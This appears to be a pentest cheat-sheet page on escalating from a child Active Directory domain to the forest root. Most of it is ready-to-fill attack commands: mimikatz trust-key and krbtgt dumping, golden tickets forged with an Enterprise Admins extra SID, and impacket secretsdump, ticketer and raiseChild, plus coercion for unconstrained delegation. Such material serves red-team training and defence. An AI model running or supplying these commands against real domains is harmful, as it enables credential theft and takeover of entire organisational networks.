# Intra-Forest Escalation

Inside a forest the trust is bidirectional and SID filtering is not applied, so compromise of a child domain leads to the parent (and the forest root). SID history in a forged ticket, or the inter-realm trust key, carries privilege across the boundary.

## Why It Works

The forest is the security boundary, not the domain. Within it, domains trust each other's SIDs without filtering, so an Enterprise Admin SID injected via SID history is honoured forest-wide.

## Prerequisites

* Domain admin in a child domain, or the inter-realm trust key
* The SID of the parent/root domain

## Execution

**`Child->Parent`**

* Trust Key
  * `mimikatz lsadump::trust /patch` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
    * `mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
      * **→ PassTheTicket**
  * `secretsdump.py -just-dc-user '<parent_domain>$' <domain>/<user>:<password>@<dc_ip>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
    * `ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeuser` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
* Golden Ticket
  * `mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
    * `mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
      * **→ PassTheTicket**
  * `raiseChild.py <child_domain>/<user>:<password>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py)
  * `ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 goldenuser` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
* Unconstrained delegation
  * coerce parent\_dc on child\_dc domain
    * **→ unconstrained delegation**

**`Parent->Child`**

* same as Child to parent

## Related

* [Trust Enumeration](file:///9685693/trusts/trust-enumeration.md) — mapping the trust first
* [Golden, Silver, Diamond & Sapphire Tickets](file:///9685693/domain-dominance/golden-and-silver-tickets.md) — the ticket forging used to carry SID history
